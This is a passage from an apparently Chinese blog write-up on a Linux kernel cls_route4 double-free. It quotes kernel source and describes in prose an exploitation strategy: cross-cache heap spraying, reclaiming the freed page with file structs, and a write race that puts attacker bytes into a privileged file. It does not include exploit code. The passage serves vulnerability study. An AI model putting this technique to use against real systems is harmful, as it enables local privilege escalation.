class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg;</span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">	     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">	     fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单分析一下，这里会进一步解析数据包，通过<code>fold = *arg;</code>语句拿出<code>route4_filter</code>，然后判断是否存在，是否<code>handle</code>，<code>handle</code>是否一致，因为是第一次创建这里的<code>fold</code>为空。接着会通过<code>f = kzalloc(sizeof(struct route4_filter), GFP_KERNEL)</code>创建一个结构体，并对其调用<code>tcf_exts_init</code>函数进行初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">tcf_exts_init</span><span class="params">(struct tcf_exts *exts, struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">int</span> action, <span class="keyword">int</span> police)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">	exts-&gt;type = <span class="number">0</span>;</span><br><span class="line">	exts-&gt;nr_actions = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* Note: we do not own yet a reference on net.</span></span><br><span class="line"><span class="comment">	 * This reference might be taken later from tcf_exts_get_net().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	exts-&gt;net = net;</span><br><span class="line">	exts-&gt;actions = kcalloc(TCA_ACT_MAX_PRIO, <span class="keyword">sizeof</span>(struct tc_action *),</span><br><span class="line">				GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!exts-&gt;actions)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	exts-&gt;action = action;</span><br><span class="line">	exts-&gt;police = police;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述看书可以看到如果内核开启了<code>CONFIG_NET_CLS_ACT</code>选项就会对其分配<code>actions</code>成员，分配的大小是256字节。完毕之后回到<code>route4_change</code>中，如果<code>fold</code>存在，则会将其数据域复制给<code>f</code>。随后调用<code>route4_set_parms</code>函数设置其他参数，后面将新创建的<code>route4_filter</code>的hash值放到对应的<code>route4_head</code>中。</p>
<p>接下来进入<code>if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</code>分支中删除掉旧的<code>route4_filter</code>的哈希值，当然在第一次运行时这里是不会进入的。</p>
<p>在最后判断<code>fold</code>是否为空，如果不为空则调用<code>tcf_queue_work</code>函数对其进行释放操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">tcf_queue_work</span><span class="params">(struct rcu_work *rwork, <span class="keyword">work_func_t</span> func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_RCU_WORK(rwork, func);</span><br><span class="line">	<span class="keyword">return</span> queue_rcu_work(tc_filter_wq, rwork);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcf_queue_work);</span><br></pre></td></tr></table></figure>

<p>这个函数是个rcu回调，这里就看他的回调函数即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __route4_delete_filter(struct route4_filter *f)</span><br><span class="line">&#123;</span><br><span class="line">	tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	tcf_exts_put_net(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">route4_delete_filter_work</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> container_of(to_rcu_work(work),</span><br><span class="line">					       struct route4_filter,</span><br><span class="line">					       rwork);</span><br><span class="line">	rtnl_lock();</span><br><span class="line">	__route4_delete_filter(f);</span><br><span class="line">	rtnl_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以其函数实现就是删除对应的成员之后删除掉<code>f</code>。</p>
<p>通过上述流程看起来还是蛮正常的，这里出现问题的地方在清除<code>hash</code>和最后释放结构体的if条件不一致导致的。可以注意到的是在前面清楚哈希值时会判断其<code>handle</code>是否存在，如果不存在则不会进入。但是后面只是判断了<code>fold</code>是否存在，如果我们创建一个<code>handle</code>为0的过滤器则不会进入到上面的分支中只会进入到下面的分支中，从而导致其索引还残留在<code>route4_head</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_delete</span><span class="params">(struct tcf_proto *tp, <span class="keyword">void</span> *arg, <span class="keyword">bool</span> *last,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> arg;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">nf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i, h1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!head || !f)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	h = f-&gt;handle;</span><br><span class="line">	b = f-&gt;bkt;</span><br><span class="line"></span><br><span class="line">	fp = &amp;b-&gt;ht[from_hash(h &gt;&gt; <span class="number">16</span>)];</span><br><span class="line">	<span class="keyword">for</span> (nf = rtnl_dereference(*fp); nf;</span><br><span class="line">	     fp = &amp;nf-&gt;next, nf = rtnl_dereference(*fp)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nf == f) &#123;</span><br><span class="line">			<span class="comment">/* unlink it */</span></span><br><span class="line">			RCU_INIT_POINTER(*fp, rtnl_dereference(f-&gt;next));</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Remove any fastmap lookups that might ref filter</span></span><br><span class="line"><span class="comment">			 * notice we unlink&#x27;d the filter so we can&#x27;t get it</span></span><br><span class="line"><span class="comment">			 * back in the fastmap.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			route4_reset_fastmap(head);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Delete it */</span></span><br><span class="line">			tcf_unbind_filter(tp, &amp;f-&gt;res);</span><br><span class="line">			tcf_exts_get_net(&amp;f-&gt;exts);</span><br><span class="line">			tcf_queue_work(&amp;f-&gt;rwork, route4_delete_filter_work);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Strip RTNL protected tree */</span></span><br><span class="line">			<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">rt</span>;</span></span><br><span class="line"></span><br><span class="line">				rt = rtnl_dereference(b-&gt;ht[i]);</span><br><span class="line">				<span class="keyword">if</span> (rt)</span><br><span class="line">					<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* OK, session has no flows */</span></span><br><span class="line">			RCU_INIT_POINTER(head-&gt;table[to_hash(h)], <span class="literal">NULL</span>);</span><br><span class="line">			kfree_rcu(b, rcu);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	*last = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span> (h1 = <span class="number">0</span>; h1 &lt;= <span class="number">256</span>; h1++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (rcu_access_pointer(head-&gt;table[h1])) &#123;</span><br><span class="line">			*last = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里再次关注ops中的<code>route4_delete</code>函数，这个函数的作用是释放所有的过滤器，这里使用的依旧是<code>route4_delete_filter_work</code>函数进行删除的，由于前面提到的<code>route4_head</code>中仍然残存<code>handle</code>为0的过滤器的哈希值，因此会对<code>route4_filter</code>和<code>route4_filter-&gt;exts-&gt;actions</code>对象存在<code>double free</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>(这里的利用机制我没有在文章中提过，但等我看完了发现我以前在适配CVE-2023-3269的时候学过T_T，<del>属于是白忙活一场了</del>)</p>
<p>既然以前的文章中没提到这里就详细介绍一下，既然这篇文章介绍了那就不再写今年那个CVE的分析文章了。</p>
<h3 id="cross-cache"><a href="#cross-cache" class="headerlink" title="cross-cache"></a>cross-cache</h3><p>在前面提到，这一利用手法是用于解决内核内部隔离存在的，在CVE-2023-3269的这篇文章中则是用于绕过NUMA机制使用的，只不过在<code>StackRot</code>利用条件更为苛刻，在把这一手法讲解完毕之后简单提一下。</p>
<p>在前面的一篇文章中详细的解释了内核中的内部隔离机制，大家应该也已经知道了<code>GFP_KERNEL_ACCOUNT</code>标识位和<code>GFP_KERNEL</code>标识位去申请<code>object</code>的时候会从不同的<code>cache</code>中去取。</p>
<p>说到本篇文章，我们前面提到的可以对两个对象进行<code>Double free</code>，其分别是<code>route4_filter</code>和<code>route4_filter-&gt;exts-&gt;actions</code>，这里主要关注他们的大小，其分别是144和256，会从不同的<code>cache</code>中去取，分别是<code>kmalloc-192</code>和<code>kmalloc-256</code>。而在内核的默认配置中<code>file</code>结构体的大小正好为256，自然而然可以联想到，如果首先使用一个可写的文件占据此位置，再释放掉再使用我们目标的文件去占取再通过某些手法是否可以达成类似于<code>dirty pipe</code>一样的效果呢？</p>
<p>这里先不考虑后续写的手法，从开始用<code>file</code>结构体开始考虑就会发现内核在分配<code>file</code>结构体时会从一个专属的缓存中取出(类似于<code>cred</code>结构体的分配)，所以这时就不得不考虑<code>cross_cache</code>了。</p>
<p>众所周知，在内核中管理内存方式主要是两种一是<code>slub</code>用于分配较小的<code>object</code>，其次是<code>buddy system</code>机制用于分配页面。当某一个<code>slab page</code>被释放时会被<code>buddy system</code>回收，在后续的某个时间可能会被重用，然而重用就可能导致不同的<code>cache</code>从同一个页中取出了用一个位置的<code>object</code>交由其他内容使用。而<code>cross-cache</code>利用方法则是利用上述这一机制进行的，当某一<code>slab page</code>中的所有内存槽被释放，那么这个<code>slab page</code>会被强制释放给<code>buddy system</code>，此时如果堆喷另一种类型的对象且其对应的缓存耗尽则会向<code>buddy system</code>申请新的内存页，如果恰好使用了我们前面恶意强制释放的<code>slab page</code>则可实现攻击。(<strong>此处的重用机制在下文有详解，为什么不在这写是因为下面分析CVE是我临时起意的</strong>)</p>
<p>将此方法运用到这一环境中很容易可以想到首先通过大量堆喷<code>basic_filter</code>结构体完成内存布局，随后分配一个<code>route4_filter</code>结构体随后继续堆喷<code>basic_filter</code>结构体，那么此时就很有可能一个页面中只存在<code>basic_filter-&gt;exts-&gt;actions</code>和<code>route4_filter-&gt;exts-&gt;actions</code>，如果控制将这个页面中的结构体对应<code>basic_filter</code>和<code>route4_filter</code>全部释放掉那么这个页面则会被强制释放进入<code>buddy system</code>中。再堆喷大量的正常文件使其成功占领我的<code>UAF object</code>，至此我们仍不知道到底是什么位置或是那个文件描述符占据了我们目标位置，所以这里使用漏洞产生<code>double free</code>再一次堆喷大量正常文件来占据刚刚的空洞，随后通过<code>kcmp</code>系统调用即可找到我们共享文件描述符的位置了。</p>
<h3 id="延长时间窗口"><a href="#延长时间窗口" class="headerlink" title="延长时间窗口"></a>延长时间窗口</h3><p>前面只提到了可以找到共享文件描述符的位置了，没有继续往后写了，因为这里会遇到一个新的问题了，这里先讲后续的步骤写出来。</p>
<p>首先，我们已经拿到了目标文件描述符，并且是两个，那我们可以依照常识进行尝试就是我们对其中一个文件描述符中进行写入，对另一个文件描述符写入恶意字符，此时再将两个文件描述符都关闭( 因为都在使用所以此处的引用计数器为2 )，此时再大量堆喷去打开目标特权文件，有一定的几率让特权文件的<code>file</code>结构体会覆盖掉原本的空洞，从而导致后面的恶意字符写入到了特权文件中去了。</p>
<p>通过前面简要的说明可以看出来这里是存在一个条件竞争的关系，需要在第一个写入垃圾字符，第二个写入恶意字符还没写入时完成偷梁换柱的戏码，看过上一篇文章的朋友可能就会想到使用<code>fuse</code>即可实现，虽然从理论上讲是可以的，但其最终都会利用到内核实现的<code>write</code>的机制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vfs_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!access_ok(buf, count)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	ret = rw_verify_area(WRITE, file, pos, count);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	<span class="keyword">if</span> (count &gt; MAX_RW_COUNT)</span><br><span class="line">		count =  MAX_RW_COUNT;</span><br><span class="line">	file_start_write(file);</span><br><span class="line">	<span class="keyword">if</span> (file-&gt;f_op-&gt;write)</span><br><span class="line">		ret = file-&gt;f_op-&gt;write(file, buf, count, pos);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (file-&gt;f_op-&gt;write_iter)</span><br><span class="line">		ret = new_sync_write(file, buf, count, pos);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		fsnotify_modify(file);</span><br><span class="line">		add_wchar(current, ret);</span><br><span class="line">	&#125;</span><br><span class="line">	inc_syscw(current);</span><br><span class="line">	file_end_write(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在经过几层调用，<code>write</code>会进入到上述函数中，可以看到在函数的开头部分会检查该文件是否可以写入随后执行<code>file_start_write</code>然后调用ops中的<code>write</code>最后执行<code>file_end_write</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_start_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	sb_start_write(file_inode(file)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_end_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	__sb_end_write(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这个<code>file_start_write</code>和<code>file_end_write</code>很容易猜出来其功能是什么，这里就是给<code>write</code>加上一个<code>inode</code>锁，当进程A在往程序中写入时进程B会被阻塞在<code>file_start_write</code>的位置，那也就意味着进程B已经通过了程序是否可写的验证了，只是等待进程A写完就会开始写入了，所以在此期间实现上面的偷梁换柱即可，而延长窗口时间的办法就是进程A写入大量数据使进程B阻塞时间延长。</p>
<h3 id="篇外CVE-2023-3269"><a href="#篇外CVE-2023-3269" class="headerlink" title="篇外CVE-2023-3269"></a>篇外CVE-2023-3269</h3><p>(与本文无瓜，这里主要举个cross-cache的🌰，仔细看了一下感觉这个考虑的问题比此篇文章考虑的要多一点)</p>
<p>这个漏洞就不展开讲述了，其是一个UAF漏洞，在cpu0访问vma时cpu1触发<code>expand_stack</code>时有一定几率会因为<code>expand_stack</code>释放掉对应的<code>maple node</code>，而另外一边则还在试图访问vma，当然是可以通过某种方式延长窗口时间，这里不过多提到。</p>
<p>所以如果我们想要实现任意地址读则需要用可控的结构体去占领比如<code>msg_msg</code>，可惜的是我们单纯堆喷<code>msg_msg</code>是无法在内存中申请到对应的位置的。</p>
<p>此漏洞的攻击方式从两个方向考虑的，第一就是开启了<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项时(该选项默认开启)，意味着打开了<code>slab</code>重用机制，这里简单介绍一下<code>slab</code>重用机制。</p>
<p>在<a href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/">向pipe_buffer说yes！</a>篇文章中详细描述了一个<code>slab</code>的申请过程但并没有讨论重用slab的选项，这里首先提一下重用的条件，在后续的代码中可以一一得到验证便于理解</p>
<ul>
<li><p>  对方的slab cache和自己的flag都不开启SLAB_NEVER_MERGE</p>
</li>
<li><p>  对方的slab cache和自己都没有构造函数</p>
</li>
<li><p>  对方的slab cache和自己的usersize都为0</p>
</li>
<li><p>  对方的slab大小和自己的相同</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 